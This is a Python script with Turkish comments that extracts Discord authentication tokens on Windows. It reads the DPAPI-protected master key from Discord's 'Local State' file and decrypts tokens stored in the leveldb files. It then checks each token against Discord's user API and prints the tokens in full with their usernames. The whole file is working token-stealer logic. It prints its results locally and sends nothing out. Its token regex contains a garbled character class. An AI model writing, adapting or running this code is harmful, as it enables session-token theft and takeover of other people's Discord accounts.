import os
import json
import base64
import re
import win32crypt
import requests
import platform
import sys
from Crypto.Cipher import AES
from colorama import Fore, Style, init

init(autoreset=True)

# --- RENK VE GÖRSEL FONKSİYONLAR ---
def rgb_to_ansi(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def gradient_text(text, start_rgb, end_rgb):
    length = len(text)
    result = ""
    for i, char in enumerate(text):
        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * i / length)
        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * i / length)
        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * i / length)
        result += rgb_to_ansi(r, g, b) + char
    return result + Style.RESET_ALL

# Renk Paletleri (RGB)
BLUE = (0, 0, 255)
CYAN = (0, 255, 255)
WHITE = (255, 255, 255)
PINK = (255, 105, 180)
GREEN = (0, 255, 0)
YELLOW = (255, 255, 0)
RED = (255, 0, 0)
MAGENTA = (255, 0, 255)

def get_os_info():
    try:
        release = platform.release()
        version = platform.version()
        if release == "10":
            # Windows 11 build numaraları genellikle 22000'den başlar
            if int(version.split('.')[2]) >= 22000:
                return "Windows 11"
            return "Windows 10"
        return f"Windows {release}"
    except:
        return "Bilinmeyen Windows"

def get_user_info(token):
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        # Discord API'sine istek at
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code == 200:
            data = r.json()
            return f"{data['username']}#{data['discriminator']}" if data['discriminator'] != '0' else data['username']
        else:
            return "Geçersiz Token"
    except:
        return "Bilinmiyor"

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        local_state = f.read()
    local_state = json.loads(local_state)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # DPAPI prefixini kaldır
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # Tag'i kaldır
        return decrypted_pass
    except Exception as e:
        return f"Hata: {e}"

def get_tokens():
    os_name = get_os_info()
    print(gradient_text(f"Sistem: {os_name}", CYAN, BLUE))
    print(gradient_text("Bilgisayar taranıyor...\n", CYAN, WHITE))

    paths = {
        'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
    }

    tokens = []
    
    # ... (paths döngüsü) ...

    for platform_name, path in paths.items():
        if not os.path.exists(path):
            continue

        print(gradient_text(f"[{platform_name}] Klasörü bulundu, taranıyor...", YELLOW, GREEN))

        try:
            local_state_path = os.path.join(path, "Local State")
            if not os.path.exists(local_state_path):
                print(gradient_text(f"  ! Local State dosyası bulunamadı: {platform_name}", RED, YELLOW))
                continue

            master_key = get_master_key(local_state_path)
            leveldb_path = os.path.join(path, "Local Storage", "leveldb")
            
            if not os.path.exists(leveldb_path):
                continue

            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                    continue

                try:
                    with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as f:
                        lines = f.readlines()

                    for line in lines:
                        for encrypted_token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            try:
                                encrypted_token_bytes = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
                                token = decrypt_password(encrypted_token_bytes, master_key)
                                if token and token not in [t[1] for t in tokens]:
                                    tokens.append((platform_name, token))
                            except:
                                pass
                except PermissionError:
                    print(gradient_text(f"  ! Dosya okuma izni yok (Discord açık olabilir): {file_name}", RED, YELLOW))

        except Exception as e:
            print(gradient_text(f"  ! Hata oluştu ({platform_name}): {e}", RED, YELLOW))

    print("\n" + gradient_text("="*60, BLUE, CYAN))
    if tokens:
        print(gradient_text(f"BULUNAN TOKENLER ({len(tokens)}):", GREEN, CYAN))
        print(gradient_text("="*60, BLUE, CYAN))
        
        valid_tokens = []
        for pl, tk in tokens:
            username = get_user_info(tk)
            is_valid = username != "Geçersiz Token" and username != "Bilinmiyor"
            valid_tokens.append({'platform': pl, 'token': tk, 'username': username, 'valid': is_valid})

        # Geçerli tokenleri başa al
        valid_tokens.sort(key=lambda x: x['valid'], reverse=True)

        for i, item in enumerate(valid_tokens):
            if i == 0 and item['valid']:
                print(gradient_text(">>> EN GÜNCEL / ÇALIŞAN TOKEN <<<", GREEN, YELLOW))
            
            print(gradient_text(f"Platform: {item['platform']} ({os_name})", CYAN, BLUE))
            print(gradient_text(f"Kullanıcı: {item['username']}", MAGENTA, PINK))
            print(gradient_text(f"Token: {item['token']}", YELLOW, WHITE))
            print(gradient_text("-" * 60, BLUE, CYAN))
    else:
        print(gradient_text("Hiçbir token bulunamadı.", RED, YELLOW))
        print(gradient_text("İpucu: Discord uygulamanızın açık ve giriş yapılmış olduğundan emin olun.", WHITE, CYAN))
    print(gradient_text("="*60, BLUE, CYAN))

if __name__ == "__main__":
    get_tokens()
    input(gradient_text("\nÇıkmak için Enter'a basın...", CYAN, WHITE))
